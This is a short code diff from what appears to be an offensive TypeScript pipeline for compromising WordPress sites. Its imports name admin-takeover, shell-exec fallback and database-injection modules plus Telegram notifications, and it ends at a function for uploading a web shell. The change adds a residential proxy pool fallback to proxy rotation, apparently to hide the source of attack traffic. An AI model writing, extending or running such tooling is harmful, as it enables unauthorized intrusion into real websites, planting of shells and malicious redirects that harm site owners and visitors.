@@ -26,6 +26,7 @@ import { uploadContentToCdn, type CdnUploadResult } from "./content-cdn";
 import { sendTelegramNotification, type TelegramNotification } from "./telegram-notifier";
 import { runWpAdminTakeover, runShellExecFallback, type WpAdminConfig, type WpTakeoverResult } from "./wp-admin-takeover";
 import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } from "./wp-db-injection";
+import { proxyPool } from "./proxy-pool";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -259,12 +260,19 @@ function selectRedirectUrl(config: PipelineConfig): string {
   return config.weightedRedirects[0].url;
 }
 
-// ─── Proxy rotation ───
+// ─── Proxy rotation (with residential proxy pool fallback) ───
 function selectProxy(config: PipelineConfig): string | undefined {
-  if (!config.proxyList || config.proxyList.length === 0) {
+  // 1. User-provided proxy list takes priority
+  if (config.proxyList && config.proxyList.length > 0) {
+    return config.proxyList[Math.floor(Math.random() * config.proxyList.length)];
+  }
+  // 2. User-provided single proxy
+  if (config.proxyUrl) {
     return config.proxyUrl;
   }
-  return config.proxyList[Math.floor(Math.random() * config.proxyList.length)];
+  // 3. Auto-select from residential proxy pool
+  const poolProxy = proxyPool.getProxy("weighted");
+  return poolProxy?.url;
 }
 
 async function uploadShellWithAllMethods(
